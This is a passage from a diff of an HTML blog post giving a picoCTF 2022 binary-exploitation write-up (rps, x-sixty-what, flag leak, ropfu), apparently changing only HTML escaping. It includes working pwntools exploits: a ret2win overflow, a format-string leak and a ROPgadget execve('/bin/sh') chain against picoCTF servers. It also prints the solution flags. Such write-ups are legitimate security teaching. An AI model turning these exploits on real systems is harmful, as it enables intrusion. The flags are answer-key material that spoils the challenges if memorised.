       return 0;
     } else {
-      puts(&quot;Please type either 1 or 2&quot;);
+      puts(&#34;Please type either 1 or 2&#34;);
     }
   }
 
   return 0;
 }
 </code></pre><p>From the source code we can see this is a Rock-Paper-Scissors game, and to get the flag, we need to win 5 times in a row. However, we can see it use this piece on code to compare our input to determine whether we win or lose:</p>
-<pre><code>if (strstr(player_turn, loses[computer_turn])) {
-  puts(&quot;You win! Play again?&quot;);
+<pre tabindex="0"><code>if (strstr(player_turn, loses[computer_turn])) {
+  puts(&#34;You win! Play again?&#34;);
   return true;
 } else {
-  puts(&quot;Seems like you didn't win this time. Play again?&quot;);
+  puts(&#34;Seems like you didn&#39;t win this time. Play again?&#34;);
   return false;
 }
 </code></pre><p>The <code>strstr()</code> function will return the first occurrence of string that found, which means that we keep winning by inputting the ultimate answer as below:</p>
-<pre><code>rockpaperscissors
+<pre tabindex="0"><code>rockpaperscissors
 </code></pre><p><img src="/img/picoctf2022-binexp/rps.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
+<pre tabindex="0"><code>picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
 </code></pre><h2 id="x-sixty-what">x-sixty-what</h2>
 <h3 id="description-7">Description</h3>
 <p>Overflow x64 code Most problems before this are 32-bit x86. Now we&rsquo;ll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program.</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -1002,10 +1003,10 @@ int main () {
 
 void flag() {
   char buf[FLAGSIZE];
-  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
-                    &quot;own debugging flag.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
     exit(0);
   }
 
@@ -1023,18 +1024,18 @@ int main(int argc, char **argv){
   setvbuf(stdout, NULL, _IONBF, 0);
   gid_t gid = getegid();
   setresgid(gid, gid, gid);
-  puts(&quot;Welcome to 64-bit. Give me a string that gets you the flag: &quot;);
+  puts(&#34;Welcome to 64-bit. Give me a string that gets you the flag: &#34;);
   vuln();
   return 0;
 }
 </code></pre><p>From the source code we can see this is a typical ret2win challenge again, but in 64-bit. Below is the script to get the flag, <code>0x40123b</code> is the address of flag function which can be obtain by using Ghidra:</p>
-<pre><code>from pwn import *
+<pre tabindex="0"><code>from pwn import *
 
 # Allows you to switch between local/GDB/remote from terminal
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
-    elif args.REMOTE:  # ('server', 'port')
+    elif args.REMOTE:  # (&#39;server&#39;, &#39;port&#39;)
         return remote(sys.argv[1], sys.argv[2], *a, **kw)
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
@@ -1043,18 +1044,18 @@ def start(argv=[], *a, **kw):
 # Specify your GDB script here for debugging
 # GDB will be launched if the exploit is run via e.g.
 # ./exploit.py GDB
-gdbscript = '''
+gdbscript = &#39;&#39;&#39;
 init-pwndbg
 continue
-'''.format(**locals())
+&#39;&#39;&#39;.format(**locals())
 
 
 # Set up pwntools for the correct architecture
-exe = './vuln'
+exe = &#39;./vuln&#39;
 # This will automatically get context arch, bits, os etc
 elf = context.binary = ELF(exe, checksec=False)
 # Change logging level to help with debugging (error/warning/info/debug)
-context.log_level = 'error'
+context.log_level = &#39;error&#39;
 
 # ===========================================================
 #                    EXPLOIT GOES HERE
@@ -1063,7 +1064,7 @@ context.log_level = 'error'
 io = start()
 
 rip_offset = 72 
-info('located RIP offset at {a}'.format(a=rip_offset))
+info(&#39;located RIP offset at {a}&#39;.format(a=rip_offset))
 
 # Build payload
 payload = flat({
@@ -1071,25 +1072,25 @@ payload = flat({
 })
 
 # Save payload to file
-write('payload', payload)
+write(&#39;payload&#39;, payload)
 
 # Start a new process
 io = start()
 
 # PWN
-io.sendlineafter(b&quot;flag: \n&quot;, payload)
+io.sendlineafter(b&#34;flag: \n&#34;, payload)
 print(io.recv())
 # Receive the flag
 io.interactive()
 </code></pre><p><img src="/img/picoctf2022-binexp/x-sixty-what.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{b1663r_15_b3773r_11c407bc}
+<pre tabindex="0"><code>picoCTF{b1663r_15_b3773r_11c407bc}
 </code></pre><h2 id="flag-leak">flag leak</h2>
 <h3 id="description-8">Description</h3>
 <p>Story telling class 1/2
 I&rsquo;m just copying and pasting with this program. What can go wrong?</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -1101,10 +1102,10 @@ I&rsquo;m just copying and pasting with this program. What can go wrong?</p>
 #define FLAGSIZE 64
 
 void readflag(char* buf, size_t len) {
-  FILE *f = fopen(&quot;flag.txt&quot;,&quot;r&quot;);
+  FILE *f = fopen(&#34;flag.txt&#34;,&#34;r&#34;);
   if (f == NULL) {
-    printf(&quot;%s %s&quot;, &quot;Please create 'flag.txt' in this directory with your&quot;,
-                    &quot;own debugging flag.\n&quot;);
+    printf(&#34;%s %s&#34;, &#34;Please create &#39;flag.txt&#39; in this directory with your&#34;,
+                    &#34;own debugging flag.\n&#34;);
     exit(0);
   }
 
@@ -1117,11 +1118,11 @@ void vuln(){
 
    readflag(flag, FLAGSIZE);
 
-   printf(&quot;Tell me a story and then I'll tell you one &gt;&gt; &quot;);
-   scanf(&quot;%127s&quot;, story);
-   printf(&quot;Here's a story - \n&quot;);
+   printf(&#34;Tell me a story and then I&#39;ll tell you one &gt;&gt; &#34;);
+   scanf(&#34;%127s&#34;, story);
+   printf(&#34;Here&#39;s a story - \n&#34;);
    printf(story);
-   printf(&quot;\n&quot;);
+   printf(&#34;\n&#34;);
 }
 
 int main(int argc, char **argv){
@@ -1136,24 +1137,24 @@ int main(int argc, char **argv){
   return 0;
 }
 </code></pre><p>From the source code we can see it will read the flag into flag variable. Besides, vulnerability is format string vulnerability by looking at this code:</p>
-<pre><code>printf(story);
+<pre tabindex="0"><code>printf(story);
 </code></pre><p>Variables are store in stack, chances are we can leak the flag by utilizing this format string vulnerability.</p>
 <p>I created a simply script to leaked the flag, not perfect but it will do its job:</p>
-<pre><code>#!/usr/bin/env python3
+<pre tabindex="0"><code>#!/usr/bin/env python3
 from pwn import *
 
-elf = context.binary = ELF(&quot;./vuln&quot;, checksec=False)
-context.log_level = &quot;error&quot;
+elf = context.binary = ELF(&#34;./vuln&#34;, checksec=False)
+context.log_level = &#34;error&#34;
 
 for x in range(130):
   try:
-    p = remote('saturn.picoctf.net', 49713)
-    p.recvuntil(b&quot;&gt;&gt; &quot;)
-    p.sendline('%{}$s'.format(x).encode())
+    p = remote(&#39;saturn.picoctf.net&#39;, 49713)
+    p.recvuntil(b&#34;&gt;&gt; &#34;)
+    p.sendline(&#39;%{}$s&#39;.format(x).encode())
     p.recvline()
     leaked = p.recvline()
-    if b&quot;CTF{&quot; in leaked:
-      print(&quot;Flag:&quot;, leaked)
+    if b&#34;CTF{&#34; in leaked:
+      print(&#34;Flag:&#34;, leaked)
       break
     else:
       print(leaked)
@@ -1162,12 +1163,12 @@ for x in range(130):
 </code></pre><p><img src="/img/picoctf2022-binexp/flag_leak.png" alt="IMG"></p>
 <p>We just need to add <code>&quot;pico&quot;</code> infront of the leaked flag.</p>
 <p>Flag:</p>
-<pre><code>picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
+<pre tabindex="0"><code>picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
 </code></pre><h2 id="ropfu">ropfu</h2>
 <h3 id="description-9">Description</h3>
 <p>What&rsquo;s ROP? Can you exploit the following program to get the flag?</p>
 <p>This challenge provided a binary and its C source code:</p>
-<pre><code>#include &lt;stdio.h&gt;
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
 #include &lt;stdlib.h&gt;
 #include &lt;string.h&gt;
 #include &lt;unistd.h&gt;
@@ -1177,7 +1178,7 @@ for x in range(130):
 
 void vuln() {
   char buf[16];
-  printf(&quot;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&quot;);
+  printf(&#34;How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n&#34;);
   return gets(buf);
 }
 
@@ -1193,62 +1194,62 @@ int main(int argc, char **argv){
   vuln();
 }
 </code></pre><p>The challenge clearly indicate we are dealing with ROP. I&rsquo;m not really familiar with it. However, a tool called <strong>ROPgadget</strong> can automate the ROP chain for us with the command below:</p>
-<pre><code>ROPgadget --binary vuln --ropchain
+<pre tabindex="0"><code>ROPgadget --binary vuln --ropchain
 </code></pre><p>With the ROP chain available, the rest is just simply assembling them:</p>
-<pre><code>#!/usr/bin/env python2
+<pre tabindex="0"><code>#!/usr/bin/env python2
 # execve generated by ROPgadget
 from pwn import *
 from struct import pack
-context.log_level = 'error'
+context.log_level = &#39;error&#39;
 
-sh = remote(&quot;saturn.picoctf.net&quot;, 62560)
+sh = remote(&#34;saturn.picoctf.net&#34;, 62560)
 
 # Padding goes here
-p = 'A'*28
+p = &#39;A&#39;*28
 
-p += pack('&lt;I', 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack('&lt;I', 0x080e5060) # @ .data
-p += pack('&lt;I', 0x41414141) # padding
-p += pack('&lt;I', 0x080b074a) # pop eax ; ret
-p += '/bin'
-p += pack('&lt;I', 0x08059102) # mov dword ptr [edx], eax ; ret
-p += pack('&lt;I', 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack('&lt;I', 0x080e5064) # @ .data + 4
-p += pack('&lt;I', 0x41414141) # padding
-p += pack('&lt;I', 0x080b074a) # pop eax ; ret
-p += '//sh'
-p += pack('&lt;I', 0x08059102) # mov dword ptr [edx], eax ; ret
-p += pack('&lt;I', 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack('&lt;I', 0x080e5068) # @ .data + 8
-p += pack('&lt;I', 0x41414141) # padding
-p += pack('&lt;I', 0x0804fb90) # xor eax, eax ; ret
-p += pack('&lt;I', 0x08059102) # mov dword ptr [edx], eax ; ret
-p += pack('&lt;I', 0x08049022) # pop ebx ; ret
-p += pack('&lt;I', 0x080e5060) # @ .data
-p += pack('&lt;I', 0x08049e39) # pop ecx ; ret
-p += pack('&lt;I', 0x080e5068) # @ .data + 8
-p += pack('&lt;I', 0x080583c9) # pop edx ; pop ebx ; ret
-p += pack('&lt;I', 0x080e5068) # @ .data + 8
-p += pack('&lt;I', 0x080e5060) # padding without overwrite ebx
-p += pack('&lt;I', 0x0804fb90) # xor eax, eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0808055e) # inc eax ; ret
-p += pack('&lt;I', 0x0804a3d2) # int 0x80
+p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080e5060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
+p += pack(&#39;&lt;I&#39;, 0x080b074a) # pop eax ; ret
+p += &#39;/bin&#39;
+p += pack(&#39;&lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080e5064) # @ .data + 4
+p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
+p += pack(&#39;&lt;I&#39;, 0x080b074a) # pop eax ; ret
+p += &#39;//sh&#39;
+p += pack(&#39;&lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080e5068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x41414141) # padding
+p += pack(&#39;&lt;I&#39;, 0x0804fb90) # xor eax, eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x08059102) # mov dword ptr [edx], eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x08049022) # pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080e5060) # @ .data
+p += pack(&#39;&lt;I&#39;, 0x08049e39) # pop ecx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080e5068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x080583c9) # pop edx ; pop ebx ; ret
+p += pack(&#39;&lt;I&#39;, 0x080e5068) # @ .data + 8
+p += pack(&#39;&lt;I&#39;, 0x080e5060) # padding without overwrite ebx
+p += pack(&#39;&lt;I&#39;, 0x0804fb90) # xor eax, eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0808055e) # inc eax ; ret
+p += pack(&#39;&lt;I&#39;, 0x0804a3d2) # int 0x80
 
 sh.sendline(p)
 sh.interactive()
 </code></pre><p><img src="/img/picoctf2022-binexp/ropfu.png" alt="IMG"></p>
 <p>Flag:</p>
-<pre><code>picoCTF{5n47ch_7h3_5h311_e81af635}
+<pre tabindex="0"><code>picoCTF{5n47ch_7h3_5h311_e81af635}
 </code></pre><p>Thank you so much for reading till here, have a great day ahead !</p>
 
     </div>
